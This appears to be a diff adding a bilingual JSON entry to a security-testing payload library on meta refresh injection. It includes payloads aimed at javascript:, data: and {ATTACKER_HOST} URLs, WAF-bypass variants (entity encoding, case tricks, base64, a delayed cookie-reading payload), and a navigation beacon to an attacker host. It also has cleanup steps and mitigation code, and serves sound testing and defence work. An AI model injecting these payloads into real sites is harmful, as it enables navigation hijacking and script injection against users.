@@ -1,0 +1,691 @@
+{
+  "schemaVersion": 1,
+  "contentStandard": 3,
+  "sourceIds": [
+    "xss2-csp-meta"
+  ],
+  "entries": [
+    {
+      "id": "xss2-csp-meta",
+      "name": {
+        "zh": "meta refresh 导航与活动 URL 注入",
+        "en": "Meta Refresh Navigation and Active URL Injection"
+      },
+      "description": {
+        "zh": "验证可注入 meta refresh 是否触发跨源导航，以及 javascript 或 data URL 在实际浏览器和 CSP 下是否执行；两类结果必须分别记录。",
+        "en": "Tests cross-origin navigation from injected meta refresh and whether javascript or data URLs execute under the actual browser and CSP, recording the outcomes separately."
+      },
+      "category": {
+        "zh": "XSS跨站脚本",
+        "en": "XSS Cross-Site Scripting"
+      },
+      "subCategory": {
+        "zh": "base 与导航劫持",
+        "en": "Base URI & Navigation Hijacking"
+      },
+      "tags": [
+        "xss2",
+        "csp_meta"
+      ],
+      "prerequisites": [
+        {
+          "zh": "meta http-equiv=refresh 能进入浏览器认可的文档位置，刷新指令未被 sanitizer 删除，且目标浏览器/CSP 对 URL scheme 的处理已记录。",
+          "en": "A meta refresh can enter a browser-recognized document position, the directive survives sanitization, and browser plus CSP handling of URL schemes is recorded."
+        },
+        {
+          "zh": "跨源导航只指向自有空页面，javascript/data 分支只设置固定 marker，并保存导航事件、CSP 控制台和目标文档来源。",
+          "en": "Cross-origin navigation points only to an owned empty page, javascript and data branches set only a fixed marker, and navigation events, CSP console output, and destination origin are preserved."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "CSP绕过: meta标签刷新",
+            "en": "Validation step 1 for Meta Refresh Navigation and Active URL Injection"
+          },
+          "command": "<meta http-equiv=\"refresh\" content=0;url=javascript:alert(1)>\n<meta http-equiv=\"refresh\" content=0;url=data:text/html,<script>alert(1)</script>>\n<meta http-equiv=\"refresh\" content=0;url=//{ATTACKER_HOST}/>\n<meta http-equiv=\"refresh\" content=0;url=https://{ATTACKER_HOST}/>\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">\n<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert(1)</script>\">\n<meta http-equiv=\"refresh\" content=\"0;url=//{ATTACKER_HOST}/\">\n<meta http-equiv=\"refresh\" content=\"0;url=https://{ATTACKER_HOST}/\">",
+          "description": {
+            "zh": "逐行以 meta refresh 导航 javascript:/data:/外域；导航发生或脚本执行即确认 meta 活动内容边界，并记录带引号与不带引号两种属性形态的差异。",
+            "en": "Navigate via meta refresh to javascript:/data:/external origins line by line; navigation occurring or script executing confirms the meta active-content boundary, recording differences between quoted and unquoted attribute forms."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "data:text/html",
+              "explanation": {
+                "zh": "内联HTML数据URI",
+                "en": "Inline HTML data URI"
+              },
+              "type": "url"
+            },
+            {
+              "part": "<script",
+              "explanation": {
+                "zh": "脚本标签注入",
+                "en": "Script tag injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "</script",
+              "explanation": {
+                "zh": "闭合脚本标签",
+                "en": "Closing script tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{ATTACKER_HOST}",
+              "explanation": {
+                "zh": "全局变量占位符",
+                "en": "Global variable placeholder"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "meta refresh 测试设置足够延迟并防止循环；出现真实表单状态丢失、顶层非测试导航、下载或跨源数据携带时停止。",
+          "en": "Meta refresh testing uses sufficient delay and prevents loops; stop on loss of real form state, non-test top-level navigation, downloads, or cross-origin data carriage."
+        },
+        {
+          "zh": "删除 meta 节点和目标页，清理 history、BFCache 与站点数据，恢复测试路由并确认重载后没有延迟导航。",
+          "en": "Remove meta nodes and target pages, clear history, BFCache, and site data, restore test routing, and confirm no delayed navigation after reload."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "data Base64 跳转",
+            "en": "data: Base64 redirect"
+          },
+          "command": "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
+          "description": {
+            "zh": "绕过 URL 内容检测：base64 文档跳转。失效条件：顶层导航到 data: 自 Chrome 60 起被拦截，预期阴性——console 报 Not allowed to navigate top frame to data URL，仅作历史行为教学对照。",
+            "en": "Base64 data: target for the refresh. Failure condition: top-frame navigation to data: URLs has been blocked since Chrome 60, so the success criteria is unreachable today; expect the console message Not allowed to navigate top frame to data URL. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "data:text/html",
+              "explanation": {
+                "zh": "内联HTML数据URI",
+                "en": "Inline HTML data URI"
+              },
+              "type": "url"
+            },
+            {
+              "part": "base64,",
+              "explanation": {
+                "zh": "Base64编码内容",
+                "en": "Base64 content"
+              },
+              "type": "value"
+            },
+            {
+              "part": "PHN2Zy",
+              "explanation": {
+                "zh": "Base64编码载荷",
+                "en": "Base64-encoded payload"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "scheme 部分编码",
+            "en": "Partially encoded scheme"
+          },
+          "command": "<meta http-equiv=\"refresh\" content=\"0;url=ja&#x76;ascript:alert(1)\">",
+          "description": {
+            "zh": "绕过 javascript: 明文：scheme 内字母用 HTML 实体编码（如 ja&#x76;ascript:），属性解析阶段即还原为 javascript:。失效条件：现代浏览器（Chrome/Edge/Firefox 2020+）不执行 meta refresh 到 javascript: 的导航；编码差异无从生效，判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Entity-encodes a scheme letter so the attribute parser restores javascript:. Failure condition: modern browsers refuse javascript: targets for meta refresh entirely, so encoding differences never come into play; expect a silent no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "%6A",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "无引号内容形态",
+            "en": "Unquoted content form"
+          },
+          "command": "<meta http-equiv='refresh' content=0;url=javascript:alert(1)>",
+          "description": {
+            "zh": "绕过 content=\"...\" 引号形态匹配。失效条件：引号形态只影响规则匹配面，现代浏览器一律不执行 meta refresh 到 javascript: 的导航；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Unquoted content attribute evades quoted rule patterns. Failure condition: attribute quoting only changes the matching surface, while modern browsers ignore javascript: targets for meta refresh altogether; expect a no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "混合大小写全混淆",
+            "en": "Full mixed-case obfuscation"
+          },
+          "command": "<MeTa charset=utf-8 http-equiv=refresh content=\"0;URL=javascript:alert(1)\">",
+          "description": {
+            "zh": "绕过小写标签/属性与固定顺序规则。失效条件：大小写混淆只影响小写敏感规则，浏览器解析归一化后仍拒绝 meta refresh 到 javascript:；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Mixed case plus charset padding against lowercase-literal rules. Failure condition: case tricks die at browser normalization, and the normalized javascript: target is refused for meta refresh regardless; expect a no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "scheme 实体编码",
+            "en": "Entity-encoded scheme"
+          },
+          "command": "<meta http-equiv=refresh content=\"0;url=javascript&#58;alert(1)\">",
+          "description": {
+            "zh": "绕过 javascript: 明文匹配：冒号实体化。失效条件：实体在属性解码阶段还原，现代浏览器对还原后的 javascript: 目标一律拒绝导航；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Entity-encodes the colon of javascript:. Failure condition: entities decode during attribute parsing and the restored scheme is refused as a meta refresh target; expect a no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&#58;",
+              "explanation": {
+                "zh": "HTML实体编码",
+                "en": "HTML entity encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "data Base64 跳转",
+            "en": "data: Base64 redirect"
+          },
+          "command": "<meta http-equiv=refresh content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+          "description": {
+            "zh": "绕过 URL 内容检测：目标 base64 化。失效条件：顶层导航到 data: 自 Chrome 60 起被拦截，预期阴性——console 报 Not allowed to navigate top frame to data URL，仅作历史行为教学对照。",
+            "en": "Base64-wraps the redirect target. Failure condition: top-frame navigation to data: URLs has been blocked since Chrome 60; expect the console message Not allowed to navigate top frame to data URL. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "data:text/html",
+              "explanation": {
+                "zh": "内联HTML数据URI",
+                "en": "Inline HTML data URI"
+              },
+              "type": "url"
+            },
+            {
+              "part": "base64,",
+              "explanation": {
+                "zh": "Base64编码内容",
+                "en": "Base64 content"
+              },
+              "type": "value"
+            },
+            {
+              "part": "PHNjcmlwdD",
+              "explanation": {
+                "zh": "Base64编码载荷",
+                "en": "Base64-encoded payload"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "大小写全混淆",
+            "en": "Full case obfuscation"
+          },
+          "command": "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=javascript:alert(1)'>",
+          "description": {
+            "zh": "绕过小写标签/属性匹配。失效条件：全大写只影响大小写敏感规则，浏览器归一化后仍拒绝 meta refresh 到 javascript:；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Uppercase everything to break lowercase rules. Failure condition: casing only matters to case-sensitive signatures, and the normalized javascript: target is refused for meta refresh anyway; expect a no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<META HTTP-EQUIV",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "延迟触发变体",
+            "en": "Delayed trigger variant"
+          },
+          "command": "<meta http-equiv=refresh content=\"3;url=javascript:alert(document.cookie)\">",
+          "description": {
+            "zh": "绕过 0 秒跳转特征并延长驻留窃取时机。失效条件：延迟只改变触发时刻，现代浏览器对延迟触发的 javascript: 元刷新同样不执行；判据当代不可达成，预期阴性，仅作历史行为教学对照。",
+            "en": "Longer delay avoids 0-second signatures and widens the dwell window. Failure condition: the delay only shifts timing, and a delayed meta refresh to javascript: is refused exactly the same; expect a no-op. Historical teaching contrast only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "document.cookie",
+              "explanation": {
+                "zh": "读取会话Cookie",
+                "en": "Reads session cookie"
+              },
+              "type": "function"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "JavaScript Meta Refresh",
+            "en": "JavaScript Meta Refresh"
+          },
+          "command": "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
+          "description": {
+            "zh": "以 meta refresh 导航到 javascript: URL；内存标记被设置且导航 URL 与 CSP 控制台被记录即确认活动 URL 边界。在隔离页面把 alert 替换为随机内存标记。失效条件：现代浏览器不执行 meta refresh 到 javascript: 的导航，内存标记永远不会被设置；预期阴性（导航不发生），保留作活动 URL 边界的历史对照。",
+            "en": "Navigate to a javascript: URL via meta refresh; the in-memory marker being set with the navigation URL and CSP console recorded confirms the active-URL boundary. Replace alert with a random in-memory marker on an isolated page. Failure condition: modern browsers refuse javascript: navigation targets for meta refresh, so the marker can never be set; expect no navigation at all. Historical contrast for the active-URL boundary only."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符",
+                "en": "Statement separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "javascript:",
+              "explanation": {
+                "zh": "JS伪协议",
+                "en": "javascript: scheme"
+              },
+              "type": "url"
+            },
+            {
+              "part": "alert(1)",
+              "explanation": {
+                "zh": "执行结果弹窗",
+                "en": "Execution probe dialog"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "meta refresh 外链导航（有效形态）",
+            "en": "Meta refresh external navigation (still effective)"
+          },
+          "command": "<meta http-equiv=refresh content=\"0;url=//{ATTACKER_HOST}/c\">",
+          "description": {
+            "zh": "注入 meta refresh 导航到攻击者控制的外部 URL：http/https 外链顶层导航在现代浏览器仍然有效，是本载体幸存的注入能力面。成立条件：meta 进入浏览器认可的文档位置且未被净化删除、跳转目标不受应用限制。成功判据：{ATTACKER_HOST} 服务端日志收到 /c 请求（顶层导航发生）；该阳性与 javascript:/data: 分支的阴性结果分开记录。",
+            "en": "Points meta refresh at an attacker-controlled external URL; top-level http/https navigation still works in modern browsers and is the surviving capability of this vector. Preconditions: the meta element lands in an effective document position, survives sanitization, and redirect targets are unrestricted. Success: the {ATTACKER_HOST} server log receives the /c request; record this positive separately from the negative javascript:/data: branches."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "url=//{ATTACKER_HOST}/c",
+              "explanation": {
+                "zh": "协议相对外链目标，顶层导航到攻击者控制的 http(s) URL",
+                "en": "Protocol-relative external target for a top-level navigation to an attacker-controlled http(s) URL"
+              },
+              "type": "url"
+            },
+            {
+              "part": "{ATTACKER_HOST}",
+              "explanation": {
+                "zh": "全局变量占位符",
+                "en": "Global variable placeholder"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "A"
+        },
+        {
+          "title": {
+            "zh": "延迟外链导航探针",
+            "en": "Delayed external navigation probe"
+          },
+          "command": "<meta http-equiv=\"refresh\" content=\"5;url=https://{ATTACKER_HOST}/probe?ref=meta-refresh\">",
+          "description": {
+            "zh": "带 5 秒延迟的 https 外链顶层导航探针：验证延迟形态同样有效，且便于把导航请求与页面内其他行为在时间轴上区分。成立条件同上（meta 生效位置、未被净化、跳转目标不受限）。成功判据：5 秒后 {ATTACKER_HOST} 收到带 ref=meta-refresh 标记的请求。",
+            "en": "A 5-second delayed https external-navigation probe confirming the delayed form works too while keeping the beacon separable from other page activity on the timeline. Same preconditions: effective document position, survives sanitization, unrestricted target. Success: {ATTACKER_HOST} receives the ref=meta-refresh request after five seconds."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<meta http-equiv",
+              "explanation": {
+                "zh": "元刷新标签",
+                "en": "Meta refresh tag"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "content=\"5;...\"",
+              "explanation": {
+                "zh": "5 秒延迟，触发时刻后移便于与页面行为区分",
+                "en": "Five-second delay shifts the trigger away from other page activity"
+              },
+              "type": "value"
+            },
+            {
+              "part": "https://{ATTACKER_HOST}/probe?ref=meta-refresh",
+              "explanation": {
+                "zh": "绝对 URL 外链目标，带来源标记便于服务端识别",
+                "en": "Absolute external target carrying a source marker for server-side identification"
+              },
+              "type": "url"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "A"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "解析“meta refresh 导航与活动 URL 注入”的生效策略",
+            "en": "Scope the Meta Refresh Navigation and Active URL Injection data flow"
+          },
+          "description": {
+            "zh": "抓取最终响应头并展开指令回退，确认前提“攻击者可以在文档允许位置插入 meta 元素，应用未限制跳转目标，且安全设计错误地假设 script-src 会覆盖所有导航”真实存在，而不是配置文档中的预期。",
+            "en": "Trace the real input to the final sink or policy decision, confirm that an attacker can insert a meta element in an effective document position, redirect targets are unrestricted, and security design incorrectly assumes script-src governs all navigation, and record browser, response-header, and relevant component versions."
+          }
+        },
+        {
+          "title": {
+            "zh": "建立“客户端导航与 CSP”策略基线",
+            "en": "Establish the Client Navigation and CSP baseline"
+          },
+          "description": {
+            "zh": "用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“分别保存最终导航 URL、页面 origin 变化和任何脚本执行标记，普通外部跳转不能被报告为 XSS”区分结果。",
+            "en": "Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS as valid evidence."
+          }
+        },
+        {
+          "title": {
+            "zh": "逐能力验证“meta refresh 导航与活动 URL 注入”",
+            "en": "Run a single-variable Meta Refresh Navigation and Active URL Injection check"
+          },
+          "description": {
+            "zh": "以受控同源路径建立 refresh 基线，再测试跨源、data 与 javascript 变体；使用自动化浏览器记录最终 URL、控制台和 CSP 事件；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。",
+            "en": "establish a controlled same-origin refresh baseline, then test cross-origin, data, and javascript variants while recording final URL, console output, and CSP events in an automated browser; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint."
+          },
+          "payload": "<meta http-equiv=\"refresh\" content=0;url=javascript:alert(1)>\n<meta http-equiv=\"refresh\" content=0;url=data:text/html,<script>alert(1)</script>>\n<meta http-equiv=\"refresh\" content=0;url=//{ATTACKER_HOST}/>\n<meta http-equiv=\"refresh\" content=0;url=https://{ATTACKER_HOST}/>\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">\n<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert(1)</script>\">\n<meta http-equiv=\"refresh\" content=\"0;url=//{ATTACKER_HOST}/\">\n<meta http-equiv=\"refresh\" content=\"0;url=https://{ATTACKER_HOST}/\">"
+        },
+        {
+          "title": {
+            "zh": "收紧 CSP 并执行回归",
+            "en": "Retest the Meta Refresh Navigation and Active URL Injection remediation boundary"
+          },
+          "description": {
+            "zh": "从用户可控内容中移除 meta http-equiv，服务端只允许业务目标跳转，并同时部署合适的导航策略、frame 限制和上下文 HTML 消毒；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。",
+            "en": "After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS no longer appears."
+          }
+        }
+      ],
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta",
+        "https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-refresh"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖 meta refresh 导航与活动 URL 的注入验证：javascript:/data:/外域三类跳转目标在实际浏览器与 CSP 下的执行差异。跨源导航与脚本执行两类结果必须分别记录。",
+          "en": "Covers meta-refresh navigation and active-URL injection verification: execution differences of javascript:/data:/external-domain targets in real browsers under CSP. Cross-origin navigation and script execution must be recorded as separate outcomes."
+        },
+        "vulnerability": {
+          "zh": "根因是攻击者可插入 meta 元素、应用未限制跳转目标，且安全设计错误假设 script-src 覆盖所有导航；浏览器对 http-equiv=refresh 的 URL 解析决定外部跳转或活动方案是否成立。",
+          "en": "The root cause is injectable meta elements, unrestricted jump targets, and a security design wrongly assuming script-src covers all navigation; the browser's URL parsing of http-equiv=refresh decides whether external jumps or active schemes stand."
+        },
+        "exploitation": {
+          "zh": "使用第 1 步命令逐行以 meta refresh 导航 javascript:/data:/外域；导航发生或脚本执行即确认 meta 活动内容边界，并记录带引号与不带引号两种属性形态的差异。以受控同源路径建立 refresh 基线，用自动化浏览器记录最终 URL、控制台与 CSP 事件。导航结果与脚本执行分开记录，不合并为同一结论。",
+          "en": "Use the step 1 command to navigate via meta refresh to javascript:/data:/external domains line by line; navigation occurring or script executing confirms the meta active-content boundary, recording differences between quoted and unquoted attribute forms. Baseline refresh against a controlled same-origin path, logging final URLs, console, and CSP events with an automated browser. Record navigation outcomes and script execution separately, never merging into one conclusion."
+        },
+        "mitigation": {
+          "zh": "从用户可控内容移除 meta http-equiv（消毒禁止 meta），服务端跳转只接受固定业务目标映射，不透传原始 URL：\n    // DOMPurify 移除 meta 注入\n    const clean = DOMPurify.sanitize(html, { FORBID_TAGS: ['meta'] });\n    // Java：白名单跳转\n    Map<String,String> T = Map.of(\"docs\", \"https://docs.example.com\");\n    String to = T.get(req.getParameter(\"to\"));\n    if (to == null) { resp.sendError(400); return; }\n    resp.sendRedirect(to);",
+          "en": "Remove meta http-equiv from user-controllable content, allow only business-target jumps server-side, and pair navigation policies, frame restrictions, and context-aware HTML sanitization; after the fix, each jump variant must be blocked or land only on business targets."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "阳性证据需分层：跨源分支是 refresh 实际导航到自有目标；活动 URL 分支则必须在目标浏览器中执行 marker，并记录执行文档来源。 假阳性边界：meta 节点存在但被忽略、URL 显示在 DOM、浏览器阻止 javascript/data、普通 HTTP 重定向或只发生外部导航都不能直接称为 XSS。",
+        "en": "Positive evidence is tiered: the cross-origin branch requires an actual refresh navigation to the owned target, while active-URL branches must execute the marker in the target browser with the execution-document origin recorded. False-positive boundary: A meta node that is ignored, a URL visible in the DOM, browser blocking of javascript or data, an ordinary HTTP redirect, or external navigation alone cannot be called XSS."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF3-0003：在 wafBypass 末尾追加 2 条外链导航有效变体（原 9 条下标 0-8 不变、不重排不删除）；原 9 条 meta refresh 到 javascript:/data: 的降级 C 注记走命令补丁通道另行处理。"
+      }
+    }
+  ]
+}
